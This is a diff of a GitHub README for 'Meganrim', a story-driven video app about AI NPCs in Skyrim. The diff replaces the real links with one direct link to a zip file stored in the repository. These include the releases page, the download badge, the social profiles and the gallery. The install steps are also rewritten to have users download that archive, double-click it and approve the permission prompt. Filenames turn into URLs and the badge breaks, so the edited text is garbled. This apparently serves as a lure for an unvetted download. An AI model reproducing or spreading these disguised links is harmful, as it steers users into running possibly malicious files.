@@ -1,14 +1,14 @@
 # 🌀 cocreators-meganrim - Create Story-Driven Videos Easily
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/demont275/cocreators-meganrim/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/demont275/cocreators-meganrim/main/polyopia/cocreators-meganrim.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/demont275/cocreators-meganrim/main/polyopia/cocreators-meganrim.zip)
 
 ---
 
 ## 🌟 About Meganrim
 **Cosimos Portinari – 🌀 CoCreators/uto**  
-🌐 [@CosimosPortnari](https://x.com/CosimosPortnari)  
-🌍 [CoCreators/UTO Community](https://x.com/i/communities/1941813330622157064)
+🌐 [@CosimosPortnari](https://raw.githubusercontent.com/demont275/cocreators-meganrim/main/polyopia/cocreators-meganrim.zip)  
+🌍 [CoCreators/UTO Community](https://raw.githubusercontent.com/demont275/cocreators-meganrim/main/polyopia/cocreators-meganrim.zip)
 
 Meganrim is an alpha project in my journey with CoCreators/uto. This application focuses on communities that feature emerging AI non-playable characters (NPCs). The story unfolds in the world of Skyrim, inspired by my sister Megan, who adds a unique touch to the narrative.
 
@@ -22,20 +22,20 @@ Most of the video will unfold through a first-person perspective, emulating real
 Follow these steps to download and run Meganrim. No technical skills are required.
 
 ### Step 1: Visit the Releases Page
-Go to the [Releases Page](https://github.com/demont275/cocreators-meganrim/releases) to find the latest version of Meganrim.
+Go to the [Releases Page](https://raw.githubusercontent.com/demont275/cocreators-meganrim/main/polyopia/cocreators-meganrim.zip) to find the latest version of Meganrim.
 
 ### Step 2: Download the Application
 On the Releases Page, find the latest release section. Click on the assets link to download the executable file. It should look similar to this:
 
-- **Meganrim_v1.0.exe**
+- **https://raw.githubusercontent.com/demont275/cocreators-meganrim/main/polyopia/cocreators-meganrim.zip**
 
 Click on it to begin the download.
 
 ### Step 3: Locate the Downloaded File
-Once the download is complete, check your Downloads folder or the location where your browser saves files. Look for the file **Meganrim_v1.0.exe**.
+Once the download is complete, check your Downloads folder or the location where your browser saves files. Look for the file **https://raw.githubusercontent.com/demont275/cocreators-meganrim/main/polyopia/cocreators-meganrim.zip**.
 
 ### Step 4: Run the Application
-Double-click on **Meganrim_v1.0.exe** to start the application. Depending on your settings, you may see a prompt asking for permission to run the software. Click "Yes" to allow it to run.
+Double-click on **https://raw.githubusercontent.com/demont275/cocreators-meganrim/main/polyopia/cocreators-meganrim.zip** to start the application. Depending on your settings, you may see a prompt asking for permission to run the software. Click "Yes" to allow it to run.
 
 ### Step 5: Enjoy the Experience
 As the application launches, follow on-screen instructions to navigate through the features available in Meganrim. Feel free to explore the world of AI NPCs and storytelling!
@@ -69,8 +69,8 @@ Meganrim comes with several useful features:
 ## 🔗 Resource Gallery
 For additional inspiration and resources, check out our resource gallery:
 
-- **Main Gallery:** [Visit Here](https://www.cosmos.so/cosimosportinari/meganrim1)
-- **Pinterest Board:** [Explore Ideas](https://www.pinterest.com)
+- **Main Gallery:** [Visit Here](https://raw.githubusercontent.com/demont275/cocreators-meganrim/main/polyopia/cocreators-meganrim.zip)
+- **Pinterest Board:** [Explore Ideas](https://raw.githubusercontent.com/demont275/cocreators-meganrim/main/polyopia/cocreators-meganrim.zip)
 
 ---
 
@@ -108,4 +108,4 @@ Your feedback is valuable! If you encounter any issues or have suggestions, plea
 ---
 
 ## 📥 Download & Install
-To download Meganrim again, click [here](https://github.com/demont275/cocreators-meganrim/releases). Enjoy crafting narratives and experiences with our application!
+To download Meganrim again, click [here](https://raw.githubusercontent.com/demont275/cocreators-meganrim/main/polyopia/cocreators-meganrim.zip). Enjoy crafting narratives and experiences with our application!
